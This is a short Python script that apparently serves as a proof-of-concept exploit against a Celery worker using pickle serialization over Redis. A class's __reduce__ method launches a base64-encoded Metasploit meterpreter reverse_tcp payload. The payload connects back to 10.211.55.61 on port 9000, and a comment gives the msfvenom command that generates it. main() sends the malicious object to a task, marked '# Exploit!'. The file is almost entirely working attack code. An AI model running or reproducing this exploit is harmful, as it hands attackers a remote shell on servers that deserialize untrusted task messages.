# -*- coding: utf-8 -*-

import time

from celery import Celery

app = Celery(broker="redis://127.0.0.1")


@app.task(name="hello_world")
def hello_world():
	print("heeeello world")


@app.task(name="heavy_action")
def heavy_action(param):

	print(param)


class MyLittleBastard(object):
	def __reduce__(self):

		import subprocess

		# Metasploit shell: python/meterpreter/reverse_tcp
		# Metasploit command: msfvenom -p python/meterpreter/reverse_tcp lhost=10.211.55.61 lport=9000 -f raw

		# Run reverse shell
		subprocess.Popen(["python", "-c",
		                  "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}["
		                  "sys.version_info[0]]("
		                  "'aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxMC4yMTEuNTUuNjEnLDkwMDApKQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK')))"])

		return self.__class__, tuple(),


def main():
	for x in range(5):
		app.send_task("hello_world")

		time.sleep(1)

	# Exploit!
	app.send_task("heavy_action", (MyLittleBastard(), ))

if __name__ == '__main__':
	main()

